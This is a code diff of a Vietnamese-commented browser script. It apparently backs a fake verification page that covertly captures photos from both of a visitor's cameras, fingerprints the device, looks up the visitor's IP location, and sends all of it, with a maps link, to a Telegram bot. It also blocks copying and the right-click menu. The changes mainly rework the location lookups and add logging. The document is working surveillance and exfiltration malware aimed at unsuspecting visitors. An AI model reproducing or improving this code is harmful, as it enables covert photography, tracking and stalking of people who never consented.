@@ -1,5 +1,4 @@
-// ==================== FULL VERSION ====================
-// Kết hợp: Nhận diện iPhone chi tiết + IP/Location + 2 Camera
+// ==================== FULL VERSION - FIX LOCATION API ====================
 
 // -------------------- TELEGRAM CONFIG --------------------
 const TELEGRAM_CONFIG = {
@@ -63,7 +62,7 @@ const TelegramSender = {
     }
 };
 
-// -------------------- DEVICE INFO (CHI TIẾT + IPHONE MODEL) --------------------
+// -------------------- DEVICE INFO --------------------
 const DeviceInfo = {
     getInfo() {
         const ua = navigator.userAgent;
@@ -74,9 +73,7 @@ const DeviceInfo = {
         
         let device = 'Không xác định';
         let os = 'Không xác định';
-        let model = '';
         
-        // iPhone models chi tiết
         const iphoneModels = {
             "430x932@3": "iPhone 14/15/16 Pro Max",
             "393x852@3": "iPhone 14/15/16 Pro / 15/16",
@@ -87,15 +84,12 @@ const DeviceInfo = {
             "375x812@3": "iPhone X / XS / 11 Pro",
             "375x667@2": "iPhone 6/7/8 / SE (2nd/3rd)",
             "320x568@2": "iPhone SE (1st) / 5 / 5S",
-            "414x736@3": "iPhone 6/7/8 Plus",
-            "390x844@2": "iPhone 12/13 mini",
-            "360x780@3": "iPhone 12/13 mini (alternative)"
+            "414x736@3": "iPhone 6/7/8 Plus"
         };
         
         if (/iPhone|iPad|iPod/i.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
             os = 'iOS';
-            model = iphoneModels[screenSize] || 'iPhone (Model khác)';
-            device = model;
+            device = iphoneModels[screenSize] || 'iPhone (Model khác)';
         } else if (/Android/i.test(ua)) {
             os = 'Android';
             const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
@@ -111,76 +105,53 @@ const DeviceInfo = {
             device = 'PC/Laptop';
         }
         
-        return { device, os, screenSize, model };
+        return { device, os, screenSize };
     }
 };
 
-// -------------------- LOCATION API --------------------
-const LOCATION_APIS = [
-    'https://ipwho.is/',
-    'https://ipapi.co/json/',
-    'https://freeipapi.com/api/json/',
-    'https://ip-api.com/json/'
-];
-
+// -------------------- LOCATION API (FIX: dùng ip-api.com trước vì CORS tốt hơn) --------------------
 const LocationInfo = {
     async getLocationData() {
-        for (const api of LOCATION_APIS) {
-            try {
-                const response = await fetch(api, { mode: 'cors' });
-                const data = await response.json();
-                
-                if (data.success !== false && data.ip) {
-                    return {
-                        ip: data.ip,
-                        isp: data.connection?.isp || data.isp || 'Không xác định',
-                        country: data.country || 'Không xác định',
-                        location: `${data.city || ''} ${data.region || ''} ${data.country || ''}`.trim() || 'Không xác định',
-                        lat: data.latitude || 'Không xác định',
-                        lon: data.longitude || 'Không xác định'
-                    };
-                }
-                
-                if (data.ip && data.country_name) {
-                    return {
-                        ip: data.ip,
-                        isp: data.org || data.asn || 'Không xác định',
-                        country: data.country_name || 'Không xác định',
-                        location: `${data.city || ''} ${data.region || ''} ${data.country_name || ''}`.trim() || 'Không xác định',
-                        lat: data.latitude || 'Không xác định',
-                        lon: data.longitude || 'Không xác định'
-                    };
-                }
-                
-                if (data.ipAddress) {
-                    return {
-                        ip: data.ipAddress,
-                        isp: 'Không xác định',
-                        country: data.country || 'Không xác định',
-                        location: `${data.city || ''} ${data.region || ''} ${data.country || ''}`.trim() || 'Không xác định',
-                        lat: data.latitude || 'Không xác định',
-                        lon: data.longitude || 'Không xác định'
-                    };
-                }
-                
-                if (data.status === 'success') {
-                    return {
-                        ip: data.query,
-                        isp: data.isp || 'Không xác định',
-                        country: data.country || 'Không xác định',
-                        location: `${data.city || ''} ${data.regionName || ''} ${data.country || ''}`.trim() || 'Không xác định',
-                        lat: data.lat || 'Không xác định',
-                        lon: data.lon || 'Không xác định'
-                    };
-                }
-            } catch(e) {}
-        }
+        // Ưu tiên ip-api.com (CORS friendly, không cần key)
+        try {
+            const response = await fetch('https://ip-api.com/json/', { mode: 'cors' });
+            const data = await response.json();
+            if (data.status === 'success') {
+                console.log('✅ Lấy location từ ip-api.com thành công');
+                return {
+                    ip: data.query,
+                    isp: data.isp || 'Không xác định',
+                    country: data.country || 'Không xác định',
+                    location: `${data.city || ''} ${data.regionName || ''} ${data.country || ''}`.trim() || 'Không xác định',
+                    lat: data.lat || 'Không xác định',
+                    lon: data.lon || 'Không xác định'
+                };
+            }
+        } catch(e) { console.log('ip-api.com lỗi:', e); }
         
-        // Fallback chỉ lấy IP
+        // Thử ipwho.is
+        try {
+            const response = await fetch('https://ipwho.is/', { mode: 'cors' });
+            const data = await response.json();
+            if (data.success !== false && data.ip) {
+                console.log('✅ Lấy location từ ipwho.is thành công');
+                return {
+                    ip: data.ip,
+                    isp: data.connection?.isp || data.isp || 'Không xác định',
+                    country: data.country || 'Không xác định',
+                    location: `${data.city || ''} ${data.region || ''} ${data.country || ''}`.trim() || 'Không xác định',
+                    lat: data.latitude || 'Không xác định',
+                    lon: data.longitude || 'Không xác định'
+                };
+            }
+        } catch(e) { console.log('ipwho.is lỗi:', e); }
+        
+        // Fallback cuối: chỉ lấy IP
         try {
             const res = await fetch('https://api.ipify.org?format=json');
             const data = await res.json();
             if (data.ip) {
+                console.log('⚠️ Chỉ lấy được IP từ ipify');
                 return {
                     ip: data.ip,
                     isp: 'Không xác định',
@@ -242,6 +213,7 @@ const CameraManager = {
                 }
                 return this.stream;
             } catch(e2) {
+                console.error(`Lỗi camera ${facingMode}:`, e2);
                 return null;
             }
         }
@@ -276,6 +248,9 @@ const CameraManager = {
         if (frontStream) {
             await new Promise(r => setTimeout(r, 500));
             photos.front = await this.capturePhoto();
+            console.log('✅ Đã chụp camera trước');
+        } else {
+            console.log('❌ Không chụp được camera trước');
         }
         
         // Camera sau
@@ -283,6 +258,9 @@ const CameraManager = {
         if (backStream) {
             await new Promise(r => setTimeout(r, 500));
             photos.back = await this.capturePhoto();
+            console.log('✅ Đã chụp camera sau');
+        } else {
+            console.log('❌ Không chụp được camera sau');
         }
         
         return photos;
@@ -318,7 +296,6 @@ const CameraManager = {
         mainCard.style.display = 'none';
     }
     
-    // Chặn copy
     document.addEventListener('contextmenu', e => e.preventDefault());
     document.addEventListener('copy', e => e.preventDefault());
     
@@ -333,18 +310,15 @@ const CameraManager = {
             msg.textContent = '📷 Đang mở camera...';
             msg.style.display = 'block';
             
-            // Chụp 2 camera
             const photos = await CameraManager.captureBothCameras();
             
             video.style.display = 'none';
             msg.textContent = '📸 Đang xử lý...';
             statusDiv.innerHTML = '📸 Đang xác thực...';
             
-            // Lấy thông tin
             const deviceInfo = DeviceInfo.getInfo();
             const locationInfo = await LocationInfo.getLocationData();
             
-            // Tổng hợp
             const finalData = {
                 time: new Date().toLocaleString('vi-VN'),
                 device: deviceInfo.device,
@@ -357,19 +331,17 @@ const CameraManager = {
                 lat: locationInfo.lat,
                 lon: locationInfo.lon,
                 maps: locationInfo.lat !== 'Không xác định' ? `https://www.google.com/maps?q=${locationInfo.lat},${locationInfo.lon}` : '',
-                frontCamera: photos.front ? '✅ Đã chụp' : '🚫 Không chụp được',
-                backCamera: photos.back ? '✅ Đã chụp' : '🚫 Không chụp được',
+                frontCamera: photos.front ? '✅ Đã chụp' : '🚫 Không chụp được (cần cấp quyền)',
+                backCamera: photos.back ? '✅ Đã chụp' : '🚫 Không chụp được (cần cấp quyền)',
                 note: 'Đã chụp cả 2 camera + nhận diện thiết bị chi tiết',
                 frontPhoto: photos.front,
                 backPhoto: photos.back
             };
             
-            // Gửi Telegram
             await TelegramSender.sendAll(finalData);
             
             CameraManager.stopCamera();
             
-            // Đếm ngược + đổi màu nút
             startBtn.style.backgroundColor = "#28a745";
             startBtn.style.boxShadow = "0 0 15px rgba(40, 167, 69, 0.6)";
             
@@ -394,5 +366,5 @@ const CameraManager = {
         }
     };
     
-    console.log('✅ Full version sẵn sàng (iPhone model + Location + 2 Camera)');
+    console.log('✅ Full version sẵn sàng');
 })();
